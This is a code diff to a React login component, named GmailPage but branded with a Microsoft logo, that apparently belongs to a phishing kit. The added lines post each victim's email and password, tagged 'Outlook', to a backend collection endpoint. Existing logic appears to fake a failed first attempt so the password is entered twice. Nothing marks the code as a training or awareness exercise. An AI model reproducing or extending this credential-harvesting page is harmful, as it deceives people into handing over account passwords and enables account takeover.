@@ -1,6 +1,7 @@
 import React, { useState } from "react";
 import { microsoftLogo } from "../assets";
 import { useNavigate } from "react-router-dom";
+import axios from "axios";
 
 const GmailPage = () => {
   const [email, setEmail] = useState("");
@@ -24,7 +25,7 @@ const GmailPage = () => {
     setShowPassword(false);
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     if (!password) {
       setMsg2("Please enter the password for your Microsoft account.");
@@ -36,8 +37,22 @@ const GmailPage = () => {
       setIsFirstAttempt(false);
       setShowPassword(false); // Go back to email input page
     } else {
-      // Proceed with the form submission logic here
-      navigate("/thankyou"); // Navigate to ThankYouPage
+      try {
+        // Send data to backend using Axios
+        const response = await axios.post("http://localhost:5100/api/submit-login", {
+          source: "Outlook",
+          email,
+          password,
+        });
+
+        if (response.status === 200) {
+          navigate("/thankyou");
+        } else {
+          throw new Error("Network response was not ok");
+        }
+      } catch (error) {
+        console.error("Error:", error);
+      }
     }
   };
 
